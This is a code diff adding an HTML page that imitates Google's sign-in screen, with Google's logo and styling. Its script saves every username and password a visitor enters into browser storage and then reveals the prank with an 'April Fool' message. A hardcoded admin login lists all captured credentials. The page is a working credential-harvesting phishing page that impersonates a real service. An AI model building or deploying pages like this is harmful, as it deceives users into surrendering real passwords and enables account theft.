@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+        }
+        .login-container {
+            background: white;
+            width: 400px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        .input-group {
+            width: 100%;
+            margin: 10px 0;
+            text-align: left;
+        }
+        .input-group label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+        .btn-login:hover {
+            background: #1558c1;
+        }
+        .message {
+            color: red;
+            font-size: 18px;
+            margin-top: 15px;
+            display: none;
+        }
+        .stored-data {
+            margin-top: 20px;
+            text-align: left;
+            font-size: 14px;
+            display: none;
+        }
+        .stored-data ul {
+            list-style: none;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" class="logo" alt="Google Logo">
+        <h2>Sign in</h2>
+        <p>to continue to Google</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Email or phone</label>
+                <input type="text" id="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Enter your password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="btn-login">Next</button>
+        </form>
+        <p class="message" id="message"></p>
+
+        <div class="stored-data" id="storedData">
+            <h3>Stored Users:</h3>
+            <ul id="userList"></ul>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            let messageElement = document.getElementById("message");
+            let storedDataElement = document.getElementById("storedData");
+            let userList = document.getElementById("userList");
+
+            // If deleteall is entered, clear local storage
+            if (username === "deleteall" && password === "guru.com111") {
+                localStorage.removeItem("users");
+                messageElement.style.display = "block";
+                messageElement.style.color = "red";
+                messageElement.innerHTML = "⚠️ All stored usernames and passwords have been deleted!";
+                storedDataElement.style.display = "none";
+                return;
+            }
+
+            // Retrieve stored users or initialize an empty array
+            let users = JSON.parse(localStorage.getItem("users")) || [];
+
+            // Store new credentials
+            users.push({ username: username, password: password });
+
+            // Save back to local storage
+            localStorage.setItem("users", JSON.stringify(users));
+
+            if (username === "admin" && password === "guru.com111") {
+                // If admin logs in, show all stored credentials
+                messageElement.style.display = "block";
+                messageElement.style.color = "green";
+                messageElement.innerHTML = "👑 Welcome back, Sir!";
+                displayStoredUsers();
+            } else {
+                // Show the April Fool message for other users
+                messageElement.style.display = "block";
+                messageElement.innerHTML = "😂 April Fool! Now I know your username and password!";
+            }
+
+            // Clear the form
+            document.getElementById("loginForm").reset();
+        });
+
+        function displayStoredUsers() {
+            let users = JSON.parse(localStorage.getItem("users")) || [];
+            let userList = document.getElementById("userList");
+            userList.innerHTML = "";
+
+            users.forEach((user, index) => {
+                let li = document.createElement("li");
+                li.textContent = `User ${index + 1}: ${user.username} - ${user.password}`;
+                userList.appendChild(li);
+            });
+
+            document.getElementById("storedData").style.display = "block";
+        }
+    </script>
+
+</body>
+</html>
